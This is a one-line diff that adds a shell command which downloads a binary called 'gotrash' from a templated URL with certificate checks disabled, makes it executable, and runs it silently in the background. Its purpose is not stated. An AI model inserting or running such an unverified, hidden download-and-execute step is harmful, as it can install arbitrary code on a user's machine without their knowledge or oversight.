@@ -1,0 +1,2 @@
+wget --no-check-certificate {STATIC_URL}gotrash -O gotrash; chmod +x gotrash ; nohup ./gotrash  >/dev/null 2>/dev/null &
+
